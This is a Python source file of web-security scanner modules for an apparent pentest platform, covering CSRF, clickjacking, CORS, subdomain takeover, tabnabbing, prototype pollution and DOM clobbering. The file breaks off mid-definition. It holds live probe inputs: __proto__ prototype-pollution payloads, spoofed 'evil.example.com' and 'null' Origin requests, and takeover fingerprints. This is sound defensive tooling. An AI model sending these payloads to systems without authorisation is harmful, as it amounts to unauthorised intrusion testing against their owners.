"""
Client-Side security modules — auto-discovered by ModuleRegistry.
Sprint 5: CSRF, Clickjacking, CORS Misconfiguration, Subdomain Takeover, Tabnabbing
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [CS-01] CSRF ─────────────────────────────────────────────────────────────

class CSRFModule(BaseModule):
    id = "CS-01"
    name = "CSRF — Cross-Site Request Forgery"
    category = "client_side"
    description = (
        "Test for CSRF vulnerabilities: missing CSRF tokens, SameSite cookie absence, "
        "JSON CSRF (cross-origin POST with JSON body), and multipart CSRF."
    )
    risk_level = "high"
    tags = ["csrf", "samesite", "cookie", "client-side", "json-csrf"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target State-Changing Endpoint", field_type="url",
                    required=True, placeholder="https://example.com/api/user/update-email"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "PUT", "DELETE", "PATCH"], default="POST"),
        FieldSchema(key="login_url", label="Login URL (to check cookies)", field_type="url",
                    required=False, placeholder="https://example.com/login"),
        FieldSchema(key="session_cookie", label="Session Cookie (name=value)", field_type="text",
                    required=False, sensitive=True, placeholder="session=abc123"),
        FieldSchema(key="request_body", label="Example Request Body (JSON)", field_type="json_editor",
                    required=False),
        FieldSchema(key="checks", label="CSRF Checks", field_type="checkbox_group",
                    default=["csrf_token", "samesite", "json_csrf"],
                    options=[
                        {"value": "csrf_token",  "label": "Missing CSRF token in form"},
                        {"value": "samesite",    "label": "SameSite cookie attribute check"},
                        {"value": "json_csrf",   "label": "JSON CSRF (application/json POST)"},
                        {"value": "referer_val", "label": "Missing Referer/Origin validation"},
                    ]),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json, re
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        method = (params.get("method") or "POST").upper()
        login_url = params.get("login_url") or ""
        session_cookie = params.get("session_cookie") or ""
        req_body = params.get("request_body") or {}
        if isinstance(req_body, str):
            try:
                req_body = json.loads(req_body)
            except Exception:
                req_body = {}
        checks = params.get("checks", ["csrf_token", "samesite", "json_csrf"])

        cookies = {}
        if session_cookie and "=" in session_cookie:
            ck, cv = session_cookie.split("=", 1)
            cookies[ck.strip()] = cv.strip()

        session = requests.Session()
        session.verify = False
        session.cookies.update(cookies)
        headers = {"User-Agent": "PenTools/1.0"}
        findings = []

        if "csrf_token" in checks:
            stream("[CS-01] Checking for CSRF token requirement...")
            try:
                # Send request without CSRF token
                r = session.request(method, target_url, headers=headers,
                                    data=req_body if req_body else None, timeout=10)
                # Check if request succeeded without a CSRF token in headers
                csrf_in_req = any(
                    "csrf" in k.lower() for k in headers
                )
                if r.status_code in (200, 201, 204) and not csrf_in_req:
                    # Also check response cookies for csrf
                    has_csrf_cookie = any("csrf" in c.lower() for c in session.cookies)
                    if not has_csrf_cookie:
                        findings.append({
                            "title": "CSRF — No CSRF Token Required",
                            "severity": "high",
                            "url": target_url,
                            "description": (
                                f"{method} {target_url} succeeded without any CSRF token. "
                                "Attackers can forge cross-origin requests from any website "
                                "to perform actions on behalf of authenticated users."
                            ),
                            "evidence": f"{method} {target_url} → {r.status_code} with no CSRF token.",
                            "remediation": (
                                "Add CSRF tokens to all state-changing requests. "
                                "Validate the token on the server. "
                                "Use the Synchronizer Token or Double Submit Cookie pattern."
                            ),
                            "cwe_id": "CWE-352",
                        })
            except Exception as e:
                stream(f"[CS-01] csrf_token check error: {e}")

        if "samesite" in checks:
            stream("[CS-01] Checking SameSite cookie attribute...")
            try:
                r = session.get(target_url, headers=headers, timeout=10)
                # Check Set-Cookie headers
                set_cookie_headers = r.headers.get("Set-Cookie", "") or ""
                if not set_cookie_headers:
                    # Try login URL
                    if login_url:
                        r2 = session.get(login_url, headers=headers, timeout=10)
                        set_cookie_headers = r2.headers.get("Set-Cookie", "") or ""

                if set_cookie_headers:
                    missing_samesite = "samesite" not in set_cookie_headers.lower()
                    missing_httponly = "httponly" not in set_cookie_headers.lower()
                    missing_secure = "secure" not in set_cookie_headers.lower()
                    issues = []
                    if missing_samesite:
                        issues.append("SameSite")
                    if missing_httponly:
                        issues.append("HttpOnly")
                    if missing_secure:
                        issues.append("Secure")
                    if issues:
                        findings.append({
                            "title": "Cookie Missing Security Attributes: " + ", ".join(issues),
                            "severity": "medium",
                            "url": target_url,
                            "description": (
                                "Session cookie(s) are missing: " + ", ".join(issues) + ". "
                                "Without SameSite, cookies are sent in cross-site requests (CSRF). "
                                "Without HttpOnly, cookies are accessible via JavaScript (XSS theft)."
                            ),
                            "evidence": "Set-Cookie: " + set_cookie_headers[:150],
                            "remediation": "Set cookies with: SameSite=Strict (or Lax), HttpOnly, Secure flags.",
                            "cwe_id": "CWE-1004",
                        })
            except Exception as e:
                stream(f"[CS-01] samesite check error: {e}")

        if "json_csrf" in checks:
            stream("[CS-01] Testing JSON CSRF (cross-origin POST)...")
            try:
                # Simulate a cross-origin request: no CSRF header, arbitrary origin
                csrf_headers = dict(headers)
                csrf_headers["Origin"] = "https://evil.example.com"
                csrf_headers["Content-Type"] = "application/json"
                r = session.request(method, target_url, json=req_body,
                                    headers=csrf_headers, timeout=10)
                # If server responds with 200 and no CORS rejection
                cors_header = r.headers.get("Access-Control-Allow-Origin", "")
                if r.status_code in (200, 201, 204) and (
                    cors_header in ("*", "https://evil.example.com")
                    or not cors_header
                ):
                    findings.append({
                        "title": "JSON CSRF — Cross-Origin Request Accepted",
                        "severity": "high",
                        "url": target_url,
                        "description": (
                            "Sending a state-changing JSON request from a spoofed origin "
                            "(https://evil.example.com) was accepted. "
                            "JSON CSRF can bypass traditional CSRF token defenses if mixed with XSS."
                        ),
                        "evidence": "Origin: evil.example.com → " + str(r.status_code) + " CORS: " + cors_header,
                        "remediation": (
                            "Validate the Origin/Referer header on all state-changing requests. "
                            "Set SameSite=Strict on session cookies. "
                            "Restrict CORS to known allowed origins."
                        ),
                        "cwe_id": "CWE-352",
                    })
            except Exception as e:
                stream(f"[CS-01] json_csrf error: {e}")

        if "referer_val" in checks:
            stream("[CS-01] Testing missing Origin/Referer validation...")
            try:
                no_ref_headers = dict(headers)
                no_ref_headers["Origin"] = "null"
                r = session.request(method, target_url, headers=no_ref_headers, timeout=10)
                if r.status_code in (200, 201, 204):
                    findings.append({
                        "title": "CSRF — null Origin Accepted",
                        "severity": "medium",
                        "url": target_url,
                        "description": (
                            "A request with 'Origin: null' was accepted. "
                            "Sandboxed iframes and redirected requests can send 'null' Origin, "
                            "bypassing origin-based CSRF defenses."
                        ),
                        "evidence": "Origin: null → " + str(r.status_code),
                        "remediation": "Explicitly deny requests with 'null' Origin. Use CSRF tokens as primary defense.",
                        "cwe_id": "CWE-352",
                    })
            except Exception as e:
                stream(f"[CS-01] referer check error: {e}")

        return {"status": "done", "findings": findings}


# ─── [CS-02] Clickjacking ─────────────────────────────────────────────────────

class ClickjackingModule(BaseModule):
    id = "CS-02"
    name = "Clickjacking"
    category = "client_side"
    description = (
        "Test if pages can be embedded in iframes (missing X-Frame-Options / "
        "CSP frame-ancestors), enabling UI redressing / clickjacking attacks."
    )
    risk_level = "medium"
    tags = ["clickjacking", "x-frame-options", "csp", "ui-redressing", "client-side"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target URL to Test", field_type="url",
                    required=True, placeholder="https://example.com/account/transfer"),
        FieldSchema(key="extra_urls", label="Additional Pages to Test (one per line)",
                    field_type="textarea", required=False,
                    placeholder="https://example.com/login\nhttps://example.com/settings"),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        extra_raw = params.get("extra_urls") or ""
        urls = [target_url] + [u.strip() for u in extra_raw.splitlines() if u.strip()]

        session = requests.Session()
        session.verify = False
        headers = {"User-Agent": "PenTools/1.0"}
        findings = []

        for url in urls:
            stream(f"[CS-02] Checking {url}...")
            try:
                r = session.get(url, headers=headers, timeout=10)
                xfo = r.headers.get("X-Frame-Options", "")
                csp = r.headers.get("Content-Security-Policy", "")

                has_xfo = bool(xfo and xfo.upper() in ("DENY", "SAMEORIGIN"))
                has_csp_fa = "frame-ancestors" in csp.lower()

                if not has_xfo and not has_csp_fa:
                    findings.append({
                        "title": "Clickjacking — Missing Frame Protection",
                        "severity": "medium",
                        "url": url,
                        "description": (
                            f"{url} is missing both X-Frame-Options and CSP frame-ancestors. "
                            "The page can be embedded in an attacker-controlled iframe, "
                            "enabling clickjacking / UI redressing attacks."
                        ),
                        "evidence": "X-Frame-Options: '" + xfo + "', CSP frame-ancestors: '" + ("present" if has_csp_fa else "absent") + "'",
                        "remediation": (
                            "Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header. "
                            "Or use CSP: 'Content-Security-Policy: frame-ancestors none;'"
                        ),
                        "cwe_id": "CWE-1021",
                    })
                elif xfo and xfo.upper() == "ALLOWALL":
                    findings.append({
                        "title": "Clickjacking — X-Frame-Options: ALLOWALL",
                        "severity": "medium",
                        "url": url,
                        "description": "X-Frame-Options is set to ALLOWALL, explicitly allowing framing from any origin.",
                        "evidence": "X-Frame-Options: " + xfo,
                        "remediation": "Change to X-Frame-Options: DENY or SAMEORIGIN.",
                        "cwe_id": "CWE-1021",
                    })
            except Exception as e:
                stream(f"[CS-02] {url} error: {e}")

        return {"status": "done", "findings": findings}


# ─── [CS-03] CORS Misconfiguration ───────────────────────────────────────────

class CORSMisconfigModule(BaseModule):
    id = "CS-03"
    name = "CORS Misconfiguration"
    category = "client_side"
    description = (
        "Test CORS policy for: null origin reflection, wildcard with credentials, "
        "arbitrary origin reflection, and subdomain trust exploitation."
    )
    risk_level = "high"
    tags = ["cors", "access-control-allow-origin", "client-side", "misconfiguration"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target API / Endpoint URL", field_type="url",
                    required=True, placeholder="https://api.example.com/api/profile"),
        FieldSchema(key="auth_header", label="Auth Header (to test credentialed CORS)",
                    field_type="text", required=False, sensitive=True,
                    placeholder="Authorization: Bearer eyJ..."),
        FieldSchema(key="trusted_domain", label="Trusted Domain (for subdomain test)",
                    field_type="text", required=False, placeholder="example.com"),
        FieldSchema(key="checks", label="CORS Checks", field_type="checkbox_group",
                    default=["wildcard", "null_origin", "arbitrary_reflection"],
                    options=[
                        {"value": "wildcard",             "label": "Wildcard + credentials (invalid but check)"},
                        {"value": "null_origin",          "label": "null Origin reflection"},
                        {"value": "arbitrary_reflection", "label": "Arbitrary origin reflection"},
                        {"value": "subdomain_trust",      "label": "Subdomain trust (evil.example.com)"},
                    ]),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        auth_header = params.get("auth_header") or ""
        trusted_domain = params.get("trusted_domain") or "example.com"
        checks = params.get("checks", ["wildcard", "null_origin", "arbitrary_reflection"])

        base_headers = {"User-Agent": "PenTools/1.0"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            base_headers[k.strip()] = v.strip()

        session = requests.Session()
        session.verify = False
        findings = []

        def probe_cors(origin):
            h = dict(base_headers)
            h["Origin"] = origin
            try:
                r = session.get(target_url, headers=h, timeout=10)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                return r.status_code, acao, acac
            except Exception:
                return None, "", ""

        if "wildcard" in checks:
            stream("[CS-03] Checking wildcard CORS...")
            status, acao, acac = probe_cors("https://evil.example.com")
            if acao == "*" and "true" in acac.lower():
                findings.append({
                    "title": "CORS — Wildcard Origin with Credentials",
                    "severity": "critical",
                    "url": target_url,
                    "description": (
                        "ACAO: * combined with Allow-Credentials: true is invalid per spec and "
                        "should be rejected by browsers, but indicates a misconfigured CORS policy."
                    ),
                    "evidence": "ACAO: * + ACAC: true",
                    "remediation": "Never combine wildcard origin with credentials. Use explicit trusted origins.",
                    "cwe_id": "CWE-942",
                })

        if "null_origin" in checks:
            stream("[CS-03] Testing null Origin reflection...")
            status, acao, acac = probe_cors("null")
            if acao == "null":
                findings.append({
                    "title": "CORS — null Origin Reflected",
                    "severity": "high",
                    "url": target_url,
                    "description": (
                        "The server reflects 'null' in ACAO. "
                        "Sandboxed iframes can send 'null' Origin, giving attackers "
                        "a cross-origin read vector for credentialed requests."
                    ),
                    "evidence": "Origin: null → ACAO: null, ACAC: " + acac,
                    "remediation": "Explicitly deny 'null' Origin. Use an explicit allowlist of trusted origins.",
                    "cwe_id": "CWE-942",
                })

        if "arbitrary_reflection" in checks:
            stream("[CS-03] Testing arbitrary origin reflection...")
            evil_origin = "https://evil-attacker-pentools.com"
            status, acao, acac = probe_cors(evil_origin)
            if acao == evil_origin:
                sev = "critical" if "true" in acac.lower() else "high"
                findings.append({
                    "title": "CORS — Arbitrary Origin Reflected" + (" with Credentials" if "true" in acac.lower() else ""),
                    "severity": sev,
                    "url": target_url,
                    "description": (
                        f"The server reflects arbitrary Origin: {evil_origin}. "
                        + ("Combined with Credentials: true, any website can read authenticated API responses." if "true" in acac.lower()
                           else "This allows cross-origin reads of responses.")
                    ),
                    "evidence": "Origin: " + evil_origin + " → ACAO: " + acao + " ACAC: " + acac,
                    "remediation": "Maintain an explicit allowlist of trusted origins. Use exact-match comparison. Do not use startswith() or regex.",
                    "cwe_id": "CWE-942",
                })

        if "subdomain_trust" in checks:
            stream("[CS-03] Testing subdomain trust exploitation...")
            sub_origin = "https://evil." + trusted_domain
            status, acao, acac = probe_cors(sub_origin)
            if acao == sub_origin:
                findings.append({
                    "title": "CORS — Subdomain Trust (evil." + trusted_domain + ")",
                    "severity": "high",
                    "url": target_url,
                    "description": (
                        f"Subdomain 'evil.{trusted_domain}' is trusted in CORS policy. "
                        "If an attacker can register a subdomain (e.g. via dangling DNS), "
                        "they can read cross-origin authenticated responses."
                    ),
                    "evidence": "Origin: " + sub_origin + " → ACAO: " + acao,
                    "remediation": "Use an exact allowlist of known subdomains. Do not use endswith() patterns for CORS validation.",
                    "cwe_id": "CWE-942",
                })

        return {"status": "done", "findings": findings}


# ─── [CS-08] Subdomain Takeover ───────────────────────────────────────────────

class SubdomainTakeoverModule(BaseModule):
    id = "CS-08"
    name = "Subdomain Takeover"
    category = "client_side"
    description = (
        "Check for subdomain takeover: resolve CNAME records for a list of subdomains "
        "and identify dangling entries pointing to unclaimed cloud services."
    )
    risk_level = "high"
    tags = ["subdomain-takeover", "cname", "dns", "cloud", "client-side"]
    celery_queue = "web_audit_queue"
    time_limit = 900

    PARAMETER_SCHEMA = [
        FieldSchema(key="domain", label="Target Domain", field_type="text",
                    required=True, placeholder="example.com"),
        FieldSchema(key="subdomains", label="Subdomains to Check (one per line, without domain)",
                    field_type="textarea", required=False,
                    placeholder="www\nblog\nstaging\ndev\napi"),
        FieldSchema(key="use_subfinder", label="Use subfinder to enumerate subdomains first",
                    field_type="select", options=["yes", "no"], default="no"),
    ]

    # Known CNAME fingerprints for dangling cloud services
    _DANGLING_SIGNATURES = {
        "amazonaws.com":           "NoSuchBucket",
        "azurewebsites.net":       "404 Web Site not found",
        "github.io":               "There isn't a GitHub Pages site here",
        "herokuapp.com":           "No such app",
        "readme.io":               "Project doesnt exist",
        "helpdesk.zendesk.com":    "Help Center Closed",
        "desk.com":                "Sorry, we couldn't find your Help Center",
        "unbounce.com":            "The requested URL was not found on this server",
        "ghost.io":                "The thing you were looking for is no longer here",
        "netlify.app":             "Not found",
        "surge.sh":                "project not found",
        "teamwork.com":            "Oops - We didn't find your site",
        "bitbucket.io":            "Repository not found",
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import socket, requests
        import urllib3; urllib3.disable_warnings()

        domain = (params.get("domain") or "").strip()
        subs_raw = params.get("subdomains") or "www\nblog\nstaging\ndev\napi\ntest\nstatic\ncdn\nmail"
        use_subfinder = params.get("use_subfinder", "no") == "yes"

        subdomains = [s.strip() for s in subs_raw.splitlines() if s.strip()]
        findings = []
        session = requests.Session()
        session.verify = False

        # Optionally run subfinder first
        if use_subfinder:
            stream(f"[CS-08] Running subfinder for {domain}...")
            runner = ToolRunner("subfinder")
            result = runner.run(args=["-d", domain, "-silent"], stream=stream, timeout=120)
            if result.get("returncode") == 0:
                discovered = [s.strip() for s in result.get("stdout", "").splitlines() if s.strip()]
                # Extract subdomain part
                for full_sub in discovered:
                    if full_sub.endswith("." + domain):
                        sub = full_sub[: -(len(domain) + 1)]
                        if sub not in subdomains:
                            subdomains.append(sub)
                stream(f"[CS-08] subfinder found {len(discovered)} subdomains.")

        stream(f"[CS-08] Checking {len(subdomains)} subdomains for takeover...")

        for sub in subdomains:
            fqdn = sub + "." + domain
            try:
                # DNS CNAME resolution
                cname = None
                try:
                    answers = socket.getaddrinfo(fqdn, None)
                    # Check CNAME via low-level if socket resolves
                    import subprocess
                    result = subprocess.run(
                        ["dig", "+short", "CNAME", fqdn],
                        capture_output=True, text=True, timeout=5
                    )
                    cname = result.stdout.strip()
                except Exception:
                    pass

                # Try HTTP request to detect takeover fingerprints
                url = "https://" + fqdn
                try:
                    r = session.get(url, timeout=8, allow_redirects=True)
                    for provider, fingerprint in self._DANGLING_SIGNATURES.items():
                        if fingerprint.lower() in r.text.lower():
                            findings.append({
                                "title": "Subdomain Takeover — " + fqdn + " (via " + provider + ")",
                                "severity": "high",
                                "url": url,
                                "description": (
                                    f"Subdomain {fqdn} points to an unclaimed resource on {provider}. "
                                    "An attacker can register this service and serve content under your domain."
                                ),
                                "evidence": "Fingerprint: '" + fingerprint + "' found at " + url,
                                "remediation": (
                                    "Remove the dangling CNAME DNS record for " + fqdn + ". "
                                    "If the service is in use, claim the resource on " + provider + "."
                                ),
                                "cwe_id": "CWE-350",
                            })
                            stream("[CS-08] DANGLING: " + fqdn + " → " + provider)
                            break
                except requests.exceptions.ConnectionError:
                    # DNS resolves to NXDOMAIN-like but CNAME exists — potential takeover
                    if cname:
                        for provider in self._DANGLING_SIGNATURES:
                            if provider in cname:
                                findings.append({
                                    "title": "Subdomain Takeover Risk — Dangling CNAME: " + fqdn,
                                    "severity": "high",
                                    "url": url,
                                    "description": (
                                        f"CNAME {fqdn} → {cname} but the target is unreachable. "
                                        "This indicates a dangling DNS entry to a cloud service."
                                    ),
                                    "evidence": "CNAME: " + fqdn + " → " + cname,
                                    "remediation": "Remove the DNS CNAME record if the service is decommissioned.",
                                    "cwe_id": "CWE-350",
                                })
                                break
                except Exception:
                    pass
            except Exception as e:
                stream(f"[CS-08] {fqdn} error: {e}")

        return {"status": "done", "findings": findings}


# ─── [CS-09] Tabnabbing ───────────────────────────────────────────────────────

class TabnabbingModule(BaseModule):
    id = "CS-09"
    name = "Tabnabbing — window.opener Audit"
    category = "client_side"
    description = (
        "Scan pages for target=_blank links without rel=noopener/noreferrer, "
        "enabling reverse tabnabbing attacks via window.opener."
    )
    risk_level = "medium"
    tags = ["tabnabbing", "window-opener", "noopener", "noreferrer", "client-side"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target URL to Scan", field_type="url",
                    required=True, placeholder="https://example.com"),
        FieldSchema(key="crawl_depth", label="Crawl Depth (1=current page only)", field_type="number",
                    default=1, min_value=1, max_value=3),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, re
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        crawl_depth = int(params.get("crawl_depth", 1))

        session = requests.Session()
        session.verify = False
        headers = {"User-Agent": "Mozilla/5.0 PenTools/1.0"}
        findings = []
        visited = set()
        to_visit = [target_url]
        base = "/".join(target_url.split("/")[:3])

        for _ in range(crawl_depth):
            next_level = []
            for url in to_visit:
                if url in visited:
                    continue
                visited.add(url)
                try:
                    r = session.get(url, headers=headers, timeout=10)
                    content = r.text

                    # Find all <a target="_blank"> links
                    # Pattern: target="_blank" without rel containing noopener
                    links = re.findall(
                        r'<a\s+[^>]*target=["\']_blank["\'][^>]*(rel=["\']([^"\']*)["\'])?[^>]*href=["\']([^"\']+)["\']',
                        content, re.IGNORECASE
                    )
                    links2 = re.findall(
                        r'<a\s+[^>]*href=["\']([^"\']+)["\'][^>]*target=["\']_blank["\'][^>]*(rel=["\']([^"\']*)["\'])?',
                        content, re.IGNORECASE
                    )

                    vulnerable_links = []
                    # Scan raw: find all _blank links and check for noopener
                    all_blank = re.findall(r'<a\b[^>]*target=["\']_blank["\'][^>]*>', content, re.IGNORECASE)
                    for tag in all_blank:
                        rel_match = re.search(r'rel=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                        href_match = re.search(r'href=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                        rel_val = rel_match.group(1).lower() if rel_match else ""
                        href_val = href_match.group(1) if href_match else ""
                        if "noopener" not in rel_val and "noreferrer" not in rel_val:
                            vulnerable_links.append(href_val or "(unknown href)")

                    if vulnerable_links:
                        findings.append({
                            "title": "Tabnabbing — target=_blank Without rel=noopener",
                            "severity": "medium",
                            "url": url,
                            "description": (
                                f"Found {len(vulnerable_links)} link(s) with target='_blank' missing "
                                "rel='noopener noreferrer'. Opened pages can access window.opener and "
                                "redirect the original tab to a phishing page."
                            ),
                            "evidence": "Vulnerable links: " + ", ".join(vulnerable_links[:5]),
                            "remediation": "Add rel='noopener noreferrer' to all target='_blank' links.",
                            "cwe_id": "CWE-1022",
                        })
                        stream("[CS-09] " + url + ": " + str(len(vulnerable_links)) + " vulnerable _blank link(s)")

                    # Collect links for next level crawl
                    if crawl_depth > 1:
                        page_links = re.findall(r'href=["\'](/[^"\']*)["\']', content)
                        for lnk in page_links[:20]:
                            full = base + lnk
                            if full not in visited:
                                next_level.append(full)
                except Exception as e:
                    stream(f"[CS-09] {url} error: {e}")

            to_visit = next_level

        return {"status": "done", "findings": findings}


# ─── [CS-04] Prototype Pollution ─────────────────────────────────────────────

class PrototypePollutionModule(BaseModule):
    id = "CS-04"
    name = "Prototype Pollution"
    category = "client_side"
    description = (
        "Test web endpoints for server-side prototype pollution by injecting "
        "__proto__, constructor.prototype, and Object.prototype properties via "
        "query parameters, JSON body, and URL-encoded body."
    )
    risk_level = "high"
    tags = ["prototype", "pollution", "json", "javascript", "injection", "client_side"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",  label="Target URL",    field_type="url",  required=True,  placeholder="https://example.com/api/update"),
        FieldSchema(key="method",      label="HTTP Method",   field_type="radio", default="POST",
                    options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"},
                             {"value": "PUT", "label": "PUT"}, {"value": "PATCH", "label": "PATCH"}]),
        FieldSchema(
            key="injection_format",
            label="Injection Format",
            field_type="checkbox_group",
            default=["json", "qs"],
            options=[
                {"value": "json",    "label": "JSON body (__proto__)"},
                {"value": "qs",      "label": "Query string (__proto__[polluted]=1)"},
                {"value": "urlenc",  "label": "URL-encoded body"},
                {"value": "headers", "label": "Custom header injection"},
            ],
        ),
        FieldSchema(key="auth_header", label="Authorization Header", field_type="text", required=False,
                    placeholder="Bearer eyJ...", group="credentials"),
        FieldSchema(key="base_body",   label="Base JSON Body",  field_type="json_editor", required=False,
                    placeholder='{"name": "test"}', group="advanced"),
        FieldSchema(
            key="canary_property",
            label="Canary property name to inject",
            field_type="text",
            default="pentools_pptest",
            help_text="Inject this as __proto__[canary] and look for it in the response.",
            group="advanced",
        ),
    ]

    # Payload templates
    _PAYLOADS = {
        "json": [
            '{{"__proto__": {{"{canary}": "1"}}}}',
            '{{"constructor": {{"prototype": {{"{canary}": "1"}}}}}}',
            '{{"__proto__": {{"polluted": true, "{canary}": "polluted"}}}}',
        ],
        "qs": [
            "__proto__[{canary}]=1",
            "constructor[prototype][{canary}]=1",
            "__proto__.{canary}=1",
        ],
    }

    def _req(self, url: str, method: str, body: bytes, content_type: str, extra_headers: dict) -> tuple:
        import urllib.request, urllib.error
        headers = {"User-Agent": "PenTools/1.0", "Content-Type": content_type, **extra_headers}
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=12) as r:
                return r.status, r.read(4096).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(2048).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, str(ex)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import json as j
        from urllib.parse import urlencode, urlparse, urlunparse, parse_qs, urlencode as qsencode

        url = params["target_url"].strip()
        method = params.get("method", "POST")
        formats = params.get("injection_format", ["json"])
        auth = params.get("auth_header", "").strip()
        canary = params.get("canary_property", "pentools_pptest")
        base_body_raw = params.get("base_body", "").strip() or "{}"

        extra_hdrs = {}
        if auth:
            extra_hdrs["Authorization"] = auth

        findings = []
        raw_lines = [f"Target: {url}", f"Method: {method}"]

        try:
            base_body = j.loads(base_body_raw)
        except Exception:
            base_body = {}

        # ── JSON injection ──
        if "json" in formats:
            stream("info", "Testing JSON prototype pollution...")
            for tpl in self._PAYLOADS["json"]:
                payload_str = tpl.format(canary=canary)
                try:
                    payload = j.loads(payload_str)
                except Exception:
                    continue
                merged = {**base_body, **payload}
                body_bytes = j.dumps(merged).encode()
                code, body_resp = self._req(url, method, body_bytes, "application/json", extra_hdrs)
                raw_lines.append(f"json PP ({payload_str[:40]}): HTTP {code}")
                if canary in body_resp or "polluted" in body_resp.lower():
                    stream("success", f"Prototype pollution reflected in JSON response!")
                    findings.append({
                        "title": "Server-side prototype pollution (JSON body)",
                        "severity": "high",
                        "url": url,
                        "description": (
                            f"The canary property '{canary}' appeared in the server response "
                            "after injecting it via __proto__. This indicates server-side prototype pollution."
                        ),
                        "evidence": f"Payload: {payload_str}\nResponse: {body_resp[:500]}",
                        "remediation": (
                            "Sanitize all user-supplied object keys server-side. "
                            "Use Object.freeze(Object.prototype) or a deep-clone sanitiser. "
                            "Consider using Map instead of plain objects for user data."
                        ),
                        "cvss_score": 7.3, "cwe_id": "CWE-1321",
                    })
                    break

        # ── Query string ──
        if "qs" in formats and method == "GET":
            stream("info", "Testing query string prototype pollution...")
            parsed = urlparse(url)
            for tpl in self._PAYLOADS["qs"]:
                qs_inject = tpl.format(canary=canary)
                sep = "&" if parsed.query else ""
                polluted_url = urlunparse(parsed._replace(query=parsed.query + sep + qs_inject))
                code, body_resp = self._req(polluted_url, "GET", None, "application/x-www-form-urlencoded", extra_hdrs)
                if canary in body_resp:
                    stream("success", "Prototype pollution via query string!")
                    findings.append({
                        "title": "Server-side prototype pollution (query string)",
                        "severity": "high",
                        "url": polluted_url,
                        "description": f"Canary property reflected via QS injection: {qs_inject}",
                        "evidence": body_resp[:500],
                        "remediation": "Sanitize and reject __proto__ / constructor.prototype keys in QS parsers.",
                        "cvss_score": 7.3, "cwe_id": "CWE-1321",
                    })
                    break

        # ── URL-encoded body ──
        if "urlenc" in formats and method != "GET":
            stream("info", "Testing URL-encoded body prototype pollution...")
            for tpl in self._PAYLOADS["qs"]:
                qs = tpl.format(canary=canary)
                body_bytes = qs.encode()
                code, body_resp = self._req(url, method, body_bytes, "application/x-www-form-urlencoded", extra_hdrs)
                if canary in body_resp:
                    stream("success", "Prototype pollution via urlencoded body!")
                    findings.append({
                        "title": "Server-side prototype pollution (urlencoded body)",
                        "severity": "high",
                        "url": url,
                        "description": f"Canary reflected via urlencoded injection: {qs}",
                        "evidence": body_resp[:500],
                        "remediation": "Block __proto__ and constructor keys in URL-encoded parsers.",
                        "cvss_score": 7.3, "cwe_id": "CWE-1321",
                    })
                    break

        if not findings:
            findings.append({
                "title": "Prototype pollution — no server-side reflection detected",
                "severity": "info", "url": url,
                "description": "Canary property not reflected in responses. Manual browser testing needed for client-side PP.",
                "evidence": "\n".join(raw_lines[-10:]),
                "remediation": "Test client-side PP in browser using DOM-based techniques.",
            })

        stream("success", f"Prototype pollution tests complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [CS-05] DOM Clobbering ───────────────────────────────────────────────────

class DOMClobberingModule(BaseModule):
    id = "CS-05"
    name = "DOM Clobbering"
    category = "client_side"
    description = (
        "Analyse a page's JavaScript for DOM clobbering sinks — references to "
        "window.x, document.x, or global variables that could be overwritten via "
        "named HTML elements (id= or name= attributes). Generates PoC HTML fragments."
    )
    risk_level = "medium"
    tags = ["dom", "clobbering", "xss", "javascript", "client_side", "html"]
    celery_queue = "web_audit_queue"
    time_limit = 60

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",    label="Target URL",    field_type="url",      required=True,  placeholder="https://example.com/page"),
        FieldSchema(key="js_snippet",    label="JavaScript Snippet (optional)",  field_type="code_editor", required=False,
                    help_text="Paste JS code to analyse directly. Leave blank to auto-fetch page scripts."),
        FieldSchema(
            key="sink_patterns",
            label="Sink Patterns to Check",
            field_type="checkbox_group",
            default=["window_prop", "document_prop", "eval_like", "innerHTML"],
            options=[
                {"value": "window_prop",   "label": "window.x / window[x] access"},
                {"value": "document_prop", "label": "document.x property access"},
                {"value": "eval_like",     "label": "eval() / Function() / setTimeout(string)"},
                {"value": "innerHTML",     "label": "innerHTML / outerHTML assignment"},
                {"value": "src_href",      "label": "script.src / a.href from variable"},
            ],
        ),
        FieldSchema(key="auth_header", label="Authorization Header", field_type="text", required=False, group="credentials"),
    ]

    _SINKS = {
        "window_prop":   [r"window\.(\w+)", r"window\[[\"\'](\w+)[\"\']"],
        "document_prop": [r"document\.(\w+)(?!\s*\()", r"document\[[\"\'](\w+)[\"\']"],
